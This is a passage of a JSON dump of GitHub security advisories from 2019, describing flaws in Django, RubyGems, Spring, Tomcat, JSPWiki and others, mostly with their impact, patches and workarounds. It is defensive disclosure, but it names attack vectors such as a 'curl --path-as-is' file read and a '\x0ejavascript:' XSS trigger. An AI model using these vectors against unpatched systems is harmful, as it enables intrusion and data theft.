    "description": "## Incorrect query parsing\r\n\r\n### Impact\r\nAll users of versions prior to 0.5.1 can receive incorrect response from daemon under rare conditions, rendering downgrade of effective STS policy.\r\n\r\n### Patches\r\nProblem has been patched in version 0.5.1\r\n\r\n### Workarounds\r\nUsers may remediate this vulnerability without upgrading by applying [these patches](https://gist.github.com/Snawoot/b9da85d6b26dea5460673b29df1adc6b) to older suppoorted versions.\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory:\r\n* Open an issue in [postfix-mta-sts-resolver repo](https://github.com/Snawoot/postfix-mta-sts-resolver)\r\n* Email me at [vladislav at vm-0 dot com](mailto:vladislav-ex-gh-advisory@vm-0.com)\r\n",
    "summary": "High severity vulnerability that affects postfix-mta-sts-resolver"
  },
  {
    "ghsaId": "GHSA-6c7v-2f49-8h26",
    "publishedAt": "2019-07-03T20:37:25Z",
    "description": "An issue was discovered in Django 1.11 before 1.11.22, 2.1 before 2.1.10, and 2.2 before 2.2.3. An HTTP request is not redirected to HTTPS when the SECURE_PROXY_SSL_HEADER and SECURE_SSL_REDIRECT settings are used, and the proxy connects to Django via HTTPS. In other words, django.http.HttpRequest.scheme has incorrect behavior when a client uses HTTP.",
    "summary": "Moderate severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-p3w6-jcg4-52xh",
    "publishedAt": "2019-07-02T15:43:41Z",
    "description": "## Misusing the Django Signer API leads to predictable signatures used in verification emails\r\n\r\n### Impact\r\nThe vulnerability is a high severity one. Anyone using Django REST Registration library versions `0.2.*` - `0.4.*` with e-mail verification option (which is recommended, but needs [additional configuration](https://django-rest-registration.readthedocs.io/en/latest/quickstart.html#preferred-configuration)) is affected.\r\nIn the worst case, the attacker can take over any Django user by resetting his/her password without even receiving the reset password verification link, just by guessing the signature from publicly available data (more detailed description below).\r\n\r\n### Patches\r\nThe problem has been patched in version `0.5.0`. All library users should upgrade to version `0.5.0` or higher.\r\nThe fix will invalidate all previously generated signatures , and in consequence, all verification links in previously sent verification e-mails. Therefore semi-major version `0.5.0` was released instead of version `0.4.6` to mark that incompatibility.\r\n\r\n### Workarounds\r\nThe easiest way way is to disable the verification options by using something like the minimal configuration described [here](https://django-rest-registration.readthedocs.io/en/latest/quickstart.html#minimal-configuration). This will unfortunately disable checking whether the given e-mail is valid and make unable to users who registered an account but didn't verify it before config change.\r\n\r\nLess harsh way is to temporarily disable just the the reset password functionality:\r\n\r\n```python\r\nREST_REGISTRATION = {\r\n    # ...\r\n    'RESET_PASSWORD_VERIFICATION_ENABLED': False,\r\n    # ...\r\n}\r\n```\r\nWhich should disallow the worst case, which is account takeover by an attacker. The attacker can still use the register-email endpoint to change the email to its own (but it is less critical than resetting the password in this case).\r\n\r\nIf one already set `'RESET_PASSWORD_VERIFICATION_ONE_TIME_USE'` setting key to `True` in `REST_REGISTRATION` Django setting (which is not the default setting) then it should mitigate the security issue in case of password reset (in this case, the signature is much harder to guess by the attacker). But even in this case upgrade to newest version is highly recommended.\r\n\r\n### Technical description\r\nAfter the code [was refactored](https://github.com/apragacz/django-rest-registration/commit/b6d921e9decc9bb36a4c6d58bc607471aa824a2e) to use the [official Signer class](https://docs.djangoproject.com/en/dev/topics/signing/) the salt\r\nwas passed wrongly as secret key, replacing the `SECRET_KEY` set in\r\nDjango settings file. This leads to the Django `SECRET_KEY` not being used by the signer object. The secret key of the signer ends to be the salt which in most cases is a static string which is publicly available.\r\n\r\nIn consequence this allows, with verification enabled, to guess\r\nthe signature contained in the verification link (which is sent in a verification e-mail) by a potential attacker very easily.\r\n\r\nThe bug went unnoticed for very long time so multiple versions are affected:\r\nthis bug affects versions `0.2.*`, `0.3.*`, `0.4.*`; version `0.1.*` is not affected.\r\n\r\nRecently released version `0.5.0` contains the [fix](https://github.com/apragacz/django-rest-registration/commit/26d094fab65ea8c2694fdfb6a3ab95a7808b62d5) which correctly passes the salt to the Signer constructor as keyword argument instead as a positonal argument. It also contains additonal test so this problem should not reappear in the future.\r\n\r\n### Thanks\r\nI'd like to thank @peterthomassen from https://desec.io DNS security project for finding the bug. I'd like also to thank his employer, SSE (https://www.securesystems.de) for funding his work.\r\n\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory:\r\n* Open an issue in [GitHub issues project page](https://github.com/apragacz/django-rest-registration/issues)\r\n* Email @apragacz, author of the library \r\n\r\n",
    "summary": "High severity vulnerability that affects django-rest-registration"
  },
  {
    "ghsaId": "GHSA-xfhh-rx56-rxcr",
    "publishedAt": "2019-07-02T15:28:38Z",
    "description": "## Possible arbitrary path traversal and file access via `yard server`\r\n\r\n### Impact\r\n\r\nA path traversal vulnerability was discovered in YARD <= 0.9.19 when using `yard server` to serve documentation. This bug would allow unsanitized HTTP requests to access arbitrary files on the machine of a yard server host under certain conditions.\r\n\r\nThanks to CuongMX from Viettel Cyber Security for discovering this vulnerability.\r\n\r\n### Patches\r\n\r\nPlease upgrade to YARD v0.9.20 immediately if you are relying on yard server to host documentation in any untrusted environments.\r\n\r\n### Workarounds\r\n\r\nFor users who cannot upgrade, it is possible to perform path sanitization of HTTP requests at your webserver level. WEBrick, for example, can perform such sanitization by default (which you can use via `yard server -s webrick`), as can certain rules in your webserver configuration.\r\n\r\n",
    "summary": "Moderate severity vulnerability that affects yard"
  },
  {
    "ghsaId": "GHSA-38cg-gg9j-q9j9",
    "publishedAt": "2019-06-27T17:25:57Z",
    "description": "A vulnerability was found in keycloak before 6.0.2. The X.509 authenticator supports the verification of client certificates through the CRL, where the CRL list can be obtained from the URL provided in the certificate itself (CDP) or through the separately configured path. The CRL are often available over the network through unsecured protocols ('http' or 'ldap') and hence the caller should verify the signature and possibly the certification path. Keycloak currently doesn't validate signatures on CRL, which can result in a possibility of various attacks like man-in-the-middle.",
    "summary": "Moderate severity vulnerability that affects org.keycloak:keycloak-core"
  },
  {
    "ghsaId": "GHSA-v33x-prhc-gph5",
    "publishedAt": "2019-06-27T17:24:58Z",
    "description": "Spring Security, versions 4.2.x up to 4.2.12, and older unsupported versions support plain text passwords using PlaintextPasswordEncoder. If an application using an affected version of Spring Security is leveraging PlaintextPasswordEncoder and a user has a null encoded password, a malicious user (or attacker) can authenticate using a password of ?null?.",
    "summary": "High severity vulnerability that affects org.springframework.security:spring-security-core"
  },
  {
    "ghsaId": "GHSA-q4hg-rmq2-52q9",
    "publishedAt": "2019-06-26T01:09:40Z",
    "description": "The fix for CVE-2019-0199 was incomplete and did not address HTTP/2 connection window exhaustion on write in Apache Tomcat versions 9.0.0.M1 to 9.0.19 and 8.5.0 to 8.5.40 . By not sending WINDOW_UPDATE messages for the connection window (stream 0) clients were able to cause server-side threads to block eventually leading to thread exhaustion and a DoS.",
    "summary": "Moderate severity vulnerability that affects org.apache.tomcat.embed:tomcat-embed-core"
  },
  {
    "ghsaId": "GHSA-p426-qw2p-v95v",
    "publishedAt": "2019-06-26T01:09:35Z",
    "description": "When an Apache Geode server versions 1.0.0 to 1.8.0 is operating in secure mode, a user with write permissions for specific data regions can modify internal cluster metadata. A malicious user could modify this data in a way that affects the operation of the cluster.",
    "summary": "Moderate severity vulnerability that affects org.apache.geode:geode-core"
  },
  {
    "ghsaId": "GHSA-4wm8-fjv7-j774",
    "publishedAt": "2019-06-20T16:08:21Z",
    "description": "An issue was discovered in RubyGems 2.6 and later through 3.0.2. Since Gem::CommandManager#run calls alert_error without escaping, escape sequence injection is possible. (There are many ways to cause an error.)",
    "summary": "Escape sequence injection in RubyGems"
  },
  {
    "ghsaId": "GHSA-5x32-c9mf-49cc",
    "publishedAt": "2019-06-20T16:06:15Z",
    "description": "A Directory Traversal issue was discovered in RubyGems 2.7.6 and later through 3.0.2. Before making new directories or touching files (which now include path-checking code for symlinks), it would delete the target destination. If that destination was hidden behind a symlink, a malicious gem could delete arbitrary files on the user's machine, presuming the attacker could guess at paths. Given how frequently gem is run as sudo, and how predictable paths are on modern systems (/tmp, /usr, etc.), this could likely lead to data loss or an unusable system.",
    "summary": "Directory traversal in RubyGems"
  },
  {
    "ghsaId": "GHSA-76wm-422q-92mq",
    "publishedAt": "2019-06-20T16:06:11Z",
    "description": "An issue was discovered in RubyGems 2.6 and later through 3.0.2. A crafted gem with a multi-line name is not handled correctly. Therefore, an attacker could inject arbitrary code to the stub line of gemspec, which is eval-ed by code in ensure_loadable_spec during the preinstall check.",
    "summary": "Code injection in RubyGems"
  },
  {
    "ghsaId": "GHSA-fr32-gr5c-xq5c",
    "publishedAt": "2019-06-20T16:06:04Z",
    "description": "An issue was discovered in RubyGems 2.6 and later through 3.0.2. Since Gem::UserInteraction#verbose calls say without escaping, escape sequence injection is possible.",
    "summary": "Escape sequence injection in RubyGems"
  },
  {
    "ghsaId": "GHSA-mh37-8c3g-3fgc",
    "publishedAt": "2019-06-20T16:06:00Z",
    "description": "An issue was discovered in RubyGems 2.6 and later through 3.0.2. The gem owner command outputs the contents of the API response directly to stdout. Therefore, if the response is crafted, escape sequence injection may occur.",
    "summary": "Escape sequence injection in RubyGems"
  },
  {
    "ghsaId": "GHSA-3h4r-pjv6-cph9",
    "publishedAt": "2019-06-20T16:05:57Z",
    "description": "An issue was discovered in RubyGems 2.6 and later through 3.0.2. Gem::GemcutterUtilities#with_response may output the API response to stdout as it is. Therefore, if the API side modifies the response, escape sequence injection may occur.",
    "summary": "Escape sequence injection in RubyGems"
  },
  {
    "ghsaId": "GHSA-4vr3-9v7h-5f8v",
    "publishedAt": "2019-06-18T15:38:41Z",
    "description": "## Leaking cached authenticated requests\n\n### Impact\r\nIf you've been using one `MemoryCacheMethod` object in multiple instances of `Gw2WebApiClient` and are requesting authenticated endpoints with different access tokens, then you are likely to run into this bug.\r\n\r\nWhen using an instance of `MemoryCacheMethod` and using it with multiple instances of `Gw2WebApiClient`, there's a possibility that cached authenticated responses are leaking to another request to the same endpoint, but with a different Guild Wars 2 access token. The latter request wouldn't start however, and would return the first cached response immediately. This means that the second response (or later responses) may contain the same data as the first response, therefore leaking data from another authenticated endpoint.\r\n\r\nThe occurence of this is limited however. The Guild Wars 2 API doesn't use the `Expires` header on most (if not all) authenticated endpoints. This header is checked when caching responses. If this header isn't available, the response isn't cached at all. You should still update to at least version 0.3.1 in order to be certain that it won't happen.\r\n\r\n### Patches\r\nThis bug has been fixed in version 0.3.1. When using an authenticated endpoint, it will prepend the SHA-1 hash of the access token to the cache id.\r\n\r\n### Workarounds\r\nFor version 0.3.0 and lower, you can use one separate instance of `MemoryCacheMethod` per `Gw2WebApiClient` if you need to use it.\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory, you can open an issue in [the Gw2Sharp repository](https://github.com/Archomeda/Gw2Sharp) or contact me on [Discord](https://discord.gg/hNcpDT3).\n",
    "summary": "Low severity vulnerability that affects Gw2Sharp"
  },
  {
    "ghsaId": "GHSA-68hw-vfh7-xvg8",
    "publishedAt": "2019-06-13T20:38:09Z",
    "description": "It was found that Keycloak's Node.js adapter before version 4.8.3 did not properly verify the web token received from the server in its backchannel logout . An attacker with local access could use this to construct a malicious web token setting an NBF parameter that could prevent user access indefinitely.",
    "summary": "Moderate severity vulnerability that affects keycloak-connect"
  },
  {
    "ghsaId": "GHSA-hwcx-9p4j-7hwj",
    "publishedAt": "2019-06-13T20:22:30Z",
    "description": "XML Entity Expansion (Billion Laughs Attack) on Pippo 1.12.0 results in Denial of Service.Entities are created recursively and large amounts of heap memory is taken. Eventually, the JVM process will run out of memory. Otherwise, if the OS does not bound the memory on that process, memory will continue to be exhausted and will affect other processes on the system.",
    "summary": "Moderate severity vulnerability that affects ro.pippo:pippo-jaxb"
  },
  {
    "ghsaId": "GHSA-mmf6-6597-3v6m",
    "publishedAt": "2019-06-13T20:18:28Z",
    "description": "Spring Security OAuth versions 2.3 prior to 2.3.6, 2.2 prior to 2.2.5, 2.1 prior to 2.1.5, and 2.0 prior to 2.0.18, as well as older unsupported versions could be susceptible to an open redirector attack that can leak an authorization code. A malicious user or attacker can craft a request to the authorization endpoint using the authorization code grant type, and specify a manipulated redirection URI via the redirect_uri parameter. This can cause the authorization server to redirect the resource owner user-agent to a URI under the control of the attacker with the leaked authorization code.",
    "summary": "Moderate severity vulnerability that affects org.springframework.security.oauth:spring-security-oauth"
  },
  {
    "ghsaId": "GHSA-jwgx-9mmh-684w",
    "publishedAt": "2019-06-13T20:02:56Z",
    "description": "A vulnerability was found in Undertow web server before 2.0.21. An information exposure of plain text credentials through log files because Connectors.executeRootHandler:402 logs the HttpServerExchange object at ERROR level using UndertowLogger.REQUEST_LOGGER.undertowRequestFailed(t, exchange)",
    "summary": "Moderate severity vulnerability that affects io.undertow:undertow-core"
  },
  {
    "ghsaId": "GHSA-2479-qvv7-47qq",
    "publishedAt": "2019-06-13T16:22:13Z",
    "description": "## Potentially critical bug when making POST request against /parse/classes/_Audience\r\n\r\n### Impact\r\n\r\nIf a POST request is made to /parse/classes/_Audience (or other volatile class), any subsuquent POST requests result in an internal server error (500).\r\n\r\n\r\n### Patches\r\nAfflicted installations will also have to remove the offending collection from their database.\r\n\r\nYes, patched in 3.4.1\r\n\r\n### Workarounds\r\n\r\nYes, user can apply: https://github.com/parse-community/parse-server/commit/8709daf698ea69b59268cb66f0f7cee75b52daa5\r\n\r\n### References\r\nNothing other than this advisory at this time\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory:\r\n* Open an issue in [parse-server](https://github.com/parse-community/parse-server)\r\n* Email us at [security@parseplatform.org](mailto:security@parseplatform.org)\r\n\r\n",
    "summary": "Low severity vulnerability that affects parse-server"
  },
  {
    "ghsaId": "GHSA-fqfj-cmh6-hj49",
    "publishedAt": "2019-06-13T16:15:56Z",
    "description": "Ruby OpenID (aka ruby-openid) through 2.8.0 has a remotely exploitable flaw. This library is used by Rails web applications to integrate with OpenID Providers. Severity can range from medium to critical, depending on how a web application developer chose to employ the ruby-openid library. Developers who based their OpenID integration heavily on the \"example app\" provided by the project are at highest risk.",
    "summary": "Moderate severity vulnerability that affects ruby-openid"
  },
  {
    "ghsaId": "GHSA-22mf-97vh-x8rw",
    "publishedAt": "2019-06-13T16:12:57Z",
    "description": "** DISPUTED ** A deserialization vulnerability exists in the way parso through 0.4.0 handles grammar parsing from the cache. Cache loading relies on pickle and, provided that an evil pickle can be written to a cache grammar file and that its parsing can be triggered, this flaw leads to Arbitrary Code Execution.  NOTE: This is disputed because \"the cache directory is not under control of the attacker in any common configuration.\"",
    "summary": "High severity vulnerability that affects parso"
  },
  {
    "ghsaId": "GHSA-6fmm-47qc-p4m4",
    "publishedAt": "2019-06-13T16:12:26Z",
    "description": "Path traversal using symlink in npm harp module versions <= 0.29.0.",
    "summary": "Moderate severity vulnerability that affects harp"
  },
  {
    "ghsaId": "GHSA-46hv-7769-j7rx",
    "publishedAt": "2019-06-13T16:12:22Z",
    "description": "Information exposure through the directory listing in npm's harp module allows to access files that are supposed to be ignored according to the harp server rules.Vulnerable versions are <= 0.29.0 and no fix was applied to our knowledge.",
    "summary": "Moderate severity vulnerability that affects harp"
  },
  {
    "ghsaId": "GHSA-7rp2-fm2h-wchj",
    "publishedAt": "2019-06-10T18:43:25Z",
    "description": "An issue was discovered in Django 1.11 before 1.11.21, 2.1 before 2.1.9, and 2.2 before 2.2.2. The clickable Current URL value displayed by the AdminURLFieldWidget displays the provided value without validating it as a safe URL. Thus, an unvalidated value stored in the database, or a value provided as a URL query parameter payload, could result in an clickable JavaScript link.",
    "summary": "Moderate severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-6cc5-2vg4-cc7m",
    "publishedAt": "2019-06-10T18:05:06Z",
    "description": "In Twisted before 19.2.1, twisted.web did not validate or sanitize URIs or HTTP methods, allowing an attacker to inject invalid characters such as CRLF.",
    "summary": "Moderate severity vulnerability that affects twisted"
  },
  {
    "ghsaId": "GHSA-52mh-p2m2-w625",
    "publishedAt": "2019-06-07T20:56:59Z",
    "description": "XSS exists in the HAPI FHIR testpage overlay module of the HAPI FHIR library before 3.8.0. The attack involves unsanitized HTTP parameters being output in a form page, allowing attackers to leak cookies and other sensitive information from ca/uhn/fhir/to/BaseController.java via a specially crafted URL. (This module is not generally used in production systems so the attack surface is expected to be low, but affected systems are recommended to upgrade immediately.)",
    "summary": "Moderate severity vulnerability that affects ca.uhn.hapi.fhir:hapi-fhir-base"
  },
  {
    "ghsaId": "GHSA-g45g-g52h-39rg",
    "publishedAt": "2019-06-07T20:56:42Z",
    "description": "The Chartkick gem through 3.1.0 for Ruby allows XSS.",
    "summary": "Moderate severity vulnerability that affects chartkick"
  },
  {
    "ghsaId": "GHSA-r6v3-hpxj-r8rv",
    "publishedAt": "2019-06-07T20:56:27Z",
    "description": "A code injection issue was discovered in PyXDG before 0.26 via crafted Python code in a Category element of a Menu XML document in a .menu file. XDG_CONFIG_DIRS must be set up to trigger xdg.Menu.parse parsing within the directory containing this file. This is due to a lack of sanitization in xdg/Menu.py before an eval call.",
    "summary": "High severity vulnerability that affects pyxdg"
  },
  {
    "ghsaId": "GHSA-q22g-8fr4-qpj4",
    "publishedAt": "2019-06-06T15:32:15Z",
    "description": "lib/common/html_re.js in remarkable 1.7.1 allows Regular Expression Denial of Service (ReDoS) via a CDATA section.",
    "summary": "High severity vulnerability that affects remarkable"
  },
  {
    "ghsaId": "GHSA-hp5r-mhgp-56c9",
    "publishedAt": "2019-06-06T15:29:29Z",
    "description": "A carefully crafted plugin link invocation could trigger an XSS vulnerability on Apache JSPWiki 2.9.0 to 2.11.0.M3, which could lead to session hijacking. Initial reporting indicated ReferredPagesPlugin, but further analysis showed that multiple plugins were vulnerable.",
    "summary": "Moderate severity vulnerability that affects org.apache.jspwiki:jspwiki-main and org.apache.jspwiki:jspwiki-war"
  },
  {
    "ghsaId": "GHSA-cj6j-32rg-45r2",
    "publishedAt": "2019-06-06T15:29:25Z",
    "description": "A carefully crafted InterWiki link could trigger an XSS vulnerability on Apache JSPWiki 2.9.0 to 2.11.0.M3, which could lead to session hijacking.",
    "summary": "Moderate severity vulnerability that affects org.apache.jspwiki:jspwiki-main and org.apache.jspwiki:jspwiki-war"
  },
  {
    "ghsaId": "GHSA-cxx2-fp39-rf3r",
    "publishedAt": "2019-06-06T15:29:22Z",
    "description": "A carefully crafted malicious attachment could trigger an XSS vulnerability on Apache JSPWiki 2.9.0 to 2.11.0.M3, which could lead to session hijacking.",
    "summary": "Moderate severity vulnerability that affects org.apache.jspwiki:jspwiki-main and org.apache.jspwiki:jspwiki-war"
  },
  {
    "ghsaId": "GHSA-886v-mm6p-4m66",
    "publishedAt": "2019-06-05T09:48:02Z",
    "description": "## Urgent Upgrade\r\n\r\nThe static file server module included with GUN had a **serious vulnerability**:\r\n\r\n - Using `curl --path-as-is` allowed reads on any parent directory or files.\r\n\r\nThis did not work via the browser or via curl without as-is option.\r\n\r\n ### Fixed\r\n\r\nThis has been fixed since version `0.2019.416` and higher.\r\n\r\n ### Who Was Effected?\r\n\r\nMost NodeJS users who use the default setup, such as:\r\n\r\n - `npm start`\r\n - `node examples/http.js`\r\n - `Heroku` 1-click-deploy\r\n - `Docker`\r\n - `Now`\r\n\r\nIf you have a custom NodeJS code then you are probably safe *unless* you have something like `require('http').createServer(Gun.serve(__dirname))` in it.\r\n\r\nIf you have not upgraded, it is **mandatory** or else it is highly likely your environment variables and AWS (or other) keys could be leaked.\r\n\r\n ### Credit\r\n\r\nIt was reported and fixed by [JK0N](https://github.com/amark/gun/pull/527), but I did not understand the `--path-as-is` condition.\r\n\r\nJoonas Loppi from [function61](http://function61.com) rediscovered it and explained the urgency to me to fix it.\r\n",
    "summary": "High severity vulnerability that affects gun"
  },
  {
    "ghsaId": "GHSA-xggx-fx6w-v7ch",
    "publishedAt": "2019-06-04T15:42:15Z",
    "description": "This affects Spring Data JPA in versions up to and including 2.1.6, 2.0.14 and 1.11.20. ExampleMatcher using ExampleMatcher.StringMatcher.STARTING, ExampleMatcher.StringMatcher.ENDING or ExampleMatcher.StringMatcher.CONTAINING could return more results than anticipated when a maliciously crafted example value is supplied.",
    "summary": "Moderate severity vulnerability that affects org.springframework.data:spring-data-jpa"
  },
  {
    "ghsaId": "GHSA-37pw-qw47-4jxm",
    "publishedAt": "2019-05-31T16:09:15Z",
    "description": "In Apache Hadoop versions 3.0.0-alpha1 to 3.1.0, 2.9.0 to 2.9.1, and 2.2.0 to 2.8.4, a user who can escalate to yarn user can possibly run arbitrary commands as root user.",
    "summary": "High severity vulnerability that affects org.apache.hadoop:hadoop-main"
  },
  {
    "ghsaId": "GHSA-jjpq-gp5q-8q6w",
    "publishedAt": "2019-05-30T03:30:42Z",
    "description": "The SSI printenv command in Apache Tomcat 9.0.0.M1 to 9.0.0.17, 8.5.0 to 8.5.39 and 7.0.0 to 7.0.93 echoes user provided data without escaping and is, therefore, vulnerable to XSS. SSI is disabled by default. The printenv command is intended for debugging and is unlikely to be present in a production website.",
    "summary": "Moderate severity vulnerability that affects org.apache.tomcat.embed:tomcat-embed-core"
  },
  {
    "ghsaId": "GHSA-ww4x-rwq6-qpgf",
    "publishedAt": "2019-05-29T19:11:31Z",
    "description": "The request phase of the OmniAuth Ruby gem is vulnerable to Cross-Site Request Forgery when used as part of the Ruby on Rails framework, allowing accounts to be connected without user intent, user interaction, or feedback to the user. This permits a secondary account to be able to sign into the web application as the primary account.",
    "summary": "TODO"
  },
  {
    "ghsaId": "GHSA-2hw2-62cp-p9p7",
    "publishedAt": "2019-05-29T18:54:11Z",
    "description": "An issue is present in Apache ZooKeeper 1.0.0 to 3.4.13 and 3.5.0-alpha to 3.5.4-beta. ZooKeeper?s getACL() command doesn?t check any permission when retrieves the ACLs of the requested node and returns all information contained in the ACL Id field as plaintext string. DigestAuthenticationProvider overloads the Id field with the hash value that is used for user authentication. As a consequence, if Digest Authentication is in use, the unsalted hash value will be disclosed by getACL() request for unauthenticated or unprivileged users.",
    "summary": "Access control bypass in Apache ZooKeeper"
  },
  {
    "ghsaId": "GHSA-g86p-hgx5-2pfh",
    "publishedAt": "2019-05-29T18:48:11Z",
    "description": "Buildbot before 1.8.2 and 2.x before 2.3.1 accepts a user-submitted authorization token from OAuth and uses it to authenticate a user. If an attacker has a token allowing them to read the user details of a victim, they can login as the victim.",
    "summary": "Moderate severity vulnerability that affects buildbot"
  },
  {
    "ghsaId": "GHSA-gh4g-3gm9-5wrq",
    "publishedAt": "2019-05-29T18:38:08Z",
    "description": "XSS exists in Shave before 2.5.3 because output encoding is mishandled during the overwrite of an HTML element.",
    "summary": "Moderate severity vulnerability that affects shave"
  },
  {
    "ghsaId": "GHSA-h896-mx9x-g32g",
    "publishedAt": "2019-05-29T18:15:50Z",
    "description": "Apache Camel prior to 2.24.0 contains an XML external entity injection (XXE) vulnerability (CWE-611) due to using an outdated vulnerable JSON-lib library. This affects only the camel-xmljson component, which was removed.",
    "summary": "TODO"
  },
  {
    "ghsaId": "GHSA-23gj-368h-92pq",
    "publishedAt": "2019-05-29T18:05:11Z",
    "description": "core/api/datasets/internal/actions/Explode.java in the Dataset API in DKPro Core through 1.10.0 allows Directory Traversal, resulting in the overwrite of local files with the contents of an archive.",
    "summary": "High severity vulnerability that affects de.tudarmstadt.ukp.dkpro.core:de.tudarmstadt.ukp.dkpro.core.api.datasets-asl"
  },
  {
    "ghsaId": "GHSA-f554-x222-wgf7",
    "publishedAt": "2019-05-29T18:05:03Z",
    "description": "Xstream API versions up to 1.4.6 and version 1.4.10, if the security framework has not been initialized, may allow a remote attacker to run arbitrary shell commands by manipulating the processed input stream when unmarshaling XML or any supported format. e.g. JSON.",
    "summary": "Critical severity vulnerability that affects com.thoughtworks.xstream:xstream"
  },
  {
    "ghsaId": "GHSA-36m4-6v6m-4vpr",
    "publishedAt": "2019-05-29T18:04:55Z",
    "description": "In remarkable 1.7.1, lib/parser_inline.js mishandles URL filtering, which allows attackers to trigger XSS via unprintable characters, as demonstrated by a \\x0ejavascript: URL.",
    "summary": "Moderate severity vulnerability that affects remarkable"
  },
  {
    "ghsaId": "GHSA-42xw-2xvc-qx8m",
    "publishedAt": "2019-05-29T18:04:45Z",
    "description": "Axios up to and including 0.18.0 allows attackers to cause a denial of service (application crash) by continuing to accepting content after maxContentLength is exceeded.",
    "summary": "High severity vulnerability that affects axios"
  },
  {
    "ghsaId": "GHSA-78j5-gcmf-vqc8",
    "publishedAt": "2019-05-29T18:02:59Z",
    "description": "### Impact\nMalicious packages with content Javascript that might be executed in the User Interface, stealing user credentials. \n\n### Patches\nUsers that still using `v3` must upgrade to **> 3.12.0** or, for those have no problem to migrate to a major version, **>= 4.0.0**.\n\n### Workarounds\nNone.  Users must update.\n\n### References\nAre there any links users can visit to find out more?\n\nhttps://www.npmjs.com/advisories/832\nhttps://www.npmjs.com/advisories/833\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Read the Security Policy to find the ways to be in contact with us.",
    "summary": "Cross-Site Scripting (XSS) in Verdaccio"
  },
  {
    "ghsaId": "GHSA-5ww9-j83m-q7qx",
    "publishedAt": "2019-05-23T09:32:24Z",
    "description": "A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.x before 2.9.9. When Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint, the service has the mysql-connector-java jar (8.0.14 or earlier) in the classpath, and an attacker can host a crafted MySQL server reachable by the victim, an attacker can send a crafted JSON message that allows them to read arbitrary local files on the server. This occurs because of missing com.mysql.cj.jdbc.admin.MiniAdmin validation.",
    "summary": "Information exposure in FasterXML jackson-databind"
  },
  {
    "ghsaId": "GHSA-4x49-w62v-76q7",
    "publishedAt": "2019-05-23T08:39:23Z",
    "description": "Spring Cloud Config, versions 2.1.x prior to 2.1.2, versions 2.0.x prior to 2.0.4, and versions 1.4.x prior to 1.4.6, and older unsupported versions allow applications to serve arbitrary configuration files through the spring-cloud-config-server module. A malicious user, or attacker, can send a request using a specially crafted URL that can lead a directory traversal attack.",
    "summary": "Moderate severity vulnerability that affects org.springframework.cloud:spring-cloud-config-server"
  },
  {
    "ghsaId": "GHSA-wv67-9jq7-8r69",
    "publishedAt": "2019-05-14T04:02:45Z",
    "description": "A specifically malformed MQTT Subscribe packet crashes MQTT Brokers using the mqtt-packet module versions < 3.5.1, 4.0.0 - 4.1.3, 5.0.0 - 5.6.1, 6.0.0 - 6.1.2 for decoding.",
    "summary": "High severity vulnerability that affects mqtt-packet"
  },
  {
    "ghsaId": "GHSA-jgmr-wrwx-mgfj",
    "publishedAt": "2019-05-14T04:02:35Z",
    "description": "This affects Spring Data JPA in versions up to and including 2.1.5, 2.0.13 and 1.11.19. Derived queries using any of the predicates ?startingWith?, ?endingWith? or ?containing? could return more results than anticipated when a maliciously crafted query parameter value is supplied. Also, LIKE expressions in manually defined queries could return unexpected results if the parameter values bound did not have escaped reserved characters properly.",
    "summary": "Low severity vulnerability that affects org.springframework.data:spring-data-jpa"
  },
  {
    "ghsaId": "GHSA-h9gj-rqrw-x4fq",
    "publishedAt": "2019-05-14T04:02:24Z",
    "description": "A Server Side Request Forgery (SSRF) vulnerability affected the Apache Axis 1.4 distribution that was last released in 2006. Security and bug commits commits continue in the projects Axis 1.x Subversion repository, legacy users are encouraged to build from source. The successor to Axis 1.x is Axis2, the latest version is 1.7.9 and is not vulnerable to this issue.",
    "summary": "Server Side Request Forgery in Apache Axis"
  },
  {
    "ghsaId": "GHSA-54mg-vgrp-mwx9",
    "publishedAt": "2019-05-14T04:01:37Z",
    "description": "Ratpack versions before 1.6.1 generate a session ID using a cryptographically weak PRNG in the JDK's ThreadLocalRandom. This means that if an attacker can determine a small window for the server start time and obtain a session ID value, they can theoretically determine the sequence of session IDs.",
    "summary": "Low severity vulnerability that affects io.ratpack:ratpack-groovy, io.ratpack:ratpack-java, and io.ratpack:ratpack-session"
  },
  {
    "ghsaId": "GHSA-8v67-x8q5-3x3g",
    "publishedAt": "2019-05-14T04:01:27Z",
    "description": "Simditor through 2.3.21 allows DOM XSS via an onload attribute within a malformed SVG element.",
    "summary": "Moderate severity vulnerability that affects simditor"
  },
  {
    "ghsaId": "GHSA-rjx9-2936-9ffx",
    "publishedAt": "2019-05-14T04:01:06Z",
    "description": "Certain input files could make the code hang when Apache Sanselan 0.97-incubator was used to parse them, which could be used in a DoS attack. Note that Apache Sanselan (incubating) was renamed to Apache Commons Imaging.",
    "summary": "Moderate severity vulnerability that affects org.apache.sanselan:sanselan"
  },
  {
    "ghsaId": "GHSA-g99m-3m46-4gm9",
    "publishedAt": "2019-05-14T04:00:47Z",
    "description": "Certain input files could make the code to enter into an infinite loop when Apache Sanselan 0.97-incubator was used to parse them, which could be used in a DoS attack. Note that Apache Sanselan (incubating) was renamed to Apache Commons Imaging.",
    "summary": "Moderate severity vulnerability that affects org.apache.sanselan:sanselan"
  },
  {
    "ghsaId": "GHSA-vm59-329q-p468",
    "publishedAt": "2019-05-14T04:00:37Z",
    "description": "This vulnerability relates to the user's browser processing of DUCC webpage input data.The javascript comprising Apache UIMA DUCC (<= 2.2.2) which runs in the user's browser does not sufficiently filter user supplied inputs, which may result in unintended execution of user supplied javascript code.",
    "summary": "Moderate severity vulnerability that affects org.apache.uima:uima-ducc-web"
  },
  {
    "ghsaId": "GHSA-cqcf-4g4h-rghf",
    "publishedAt": "2019-05-14T04:00:31Z",
    "description": "In Apache Archiva before 2.2.4, it is possible to write files to the archiva server at arbitrary locations by using the artifact upload mechanism. Existing files can be overwritten, if the archiva run user has appropriate permission on the filesystem for the target file.",
    "summary": "Moderate severity vulnerability that affects org.apache.archiva:archiva"
  },
  {
    "ghsaId": "GHSA-jxgm-9f58-w4xp",
    "publishedAt": "2019-05-14T04:00:21Z",
